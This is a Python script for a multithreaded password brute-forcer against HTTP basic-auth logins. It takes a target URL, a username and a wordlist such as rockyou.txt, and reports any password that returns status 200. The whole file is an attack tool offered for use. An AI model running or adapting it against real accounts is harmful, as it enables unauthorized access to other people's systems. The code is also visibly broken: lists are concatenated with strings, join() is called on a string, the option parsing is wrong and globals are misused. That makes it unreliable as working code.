import threading
import sys
import requests
import getopt

class Bruteforcer:

    class request_performer(threading.Thread):
        def __init__(self, user, url, passwd):
            threading.Thread.__init__(self)
            self.password = passwd.split("\n")
            self.username = user
            self.url = url
            print("-"+self.password+"-")

        def run(self):
            global hit
            if not hit:
                try:
                    r = requests.get(self.url, auth=(self.username, self.password))
                    hit = r.status_code == 200
                    if hit:
                        print("[+] password found: "+self.password)
                        sys.exit()
                    else:
                        print("[!!] "+self.password+ " is not valid")
                        list[0] = list[0] - 1
                except Exception as e:
                    print(e)

    global banner
    global hit

    def print_banner(self):
        print("##############################")
        print("*  Bruteforcer by Thanatos   *")
        print("##############################")

    def usage(self):
        print("Usage:")
        print("      -w: url (http://somesite.com)")
        print("      -u: username")
        print("      -t: threads")
        print("      -f: password list")
        print("Example: ./bruteforcer.py -w http://something.com -u assad -t 5 -f rockyou.txt")


    def launcher_thread(self, passwords, threads, user, url):
        global list
        list = []
        list.append(0)
        hit = False
        while len(passwords):
            if not hit:
                try:
                    if list[0] < threads:
                        passwd = passwords.pop(0)
                        list[0] = list[0] + 1
                        thread = self.request_performer(user, url, passwd)
                        thread.start()
                except KeyboardInterrupt:
                    print("[!!] Interrupted")
                    sys.exit()
                threads.join()


    def start(self, argv):
        self.print_banner()
        if len(sys.argv) < 5:
            self.usage()
            sys.exit()
        try:
            opts, args = getopt.getopt(argv, "u:w:f:t")
        except getopt.GetoptError:
            print("Error on arguments")
            sys.exit()
        for opt,arg in opts:
            if opt == "-u":
                user = arg
            elif opt == "-w":
                url = arg
            elif opt == "-f":
                passlist = arg
            elif opt == "-t":
                threads = arg
        try:
            f = open(passlist, "r")
            passwords = f.readlines()
        except:
            print("[!!] Can't open the file !!")
            sys.exit()
        self.launcher_thread(passwords,threads, user, url)

    def main(self):
        if __name__ == "__main__":
            try:
                self.start(sys.argv)
            except KeyboardInterrupt:
                print("[!!]Interrupted")